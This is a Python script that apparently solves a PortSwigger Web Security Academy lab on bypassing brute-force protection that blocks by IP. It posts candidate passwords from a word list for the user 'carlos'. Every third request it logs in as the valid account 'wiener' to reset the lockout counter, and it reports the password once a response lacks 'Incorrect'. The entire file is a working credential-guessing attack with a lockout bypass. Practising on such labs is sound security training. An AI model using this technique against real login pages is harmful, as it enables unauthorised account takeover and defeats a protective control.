#!/usr/bin/python

from multiprocessing import Pool

import requests

# https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

URL = "https://ac961fe21f088cc380be476600c4000a.web-security-academy.net/login"

threads = []

cookies = {"session": "y43beF1CrzkFRzSTStnexzzXcjbqNt9V"}


def is_valid_pass(params):
    res = requests.post(URL, data=params, cookies=cookies)
    if params["username"] != "wiener" and res.text.find("Incorrect") == -1:
        print("password is ", params["password"])
        return True


def brute_passwords():
    with open("passwords") as passwords:
        sent_count = 3
        while True:
            if sent_count % 3 == 0:
                params = {"username": "wiener", "password": "peter"}
            else:
                line = passwords.readline()
                line = line[:-1]
                if not line:
                    break
                params = {
                    "username": "carlos",
                    "password": line,
                }
            sent_count += 1
            if is_valid_pass(params):
                break
            #  threads.append(r)
            #  r = pool.apply_async(is_valid_pass, (params, ))
            #  break


pool = Pool(1)
brute_passwords()
#  for thread in threads:
#      thread.get()
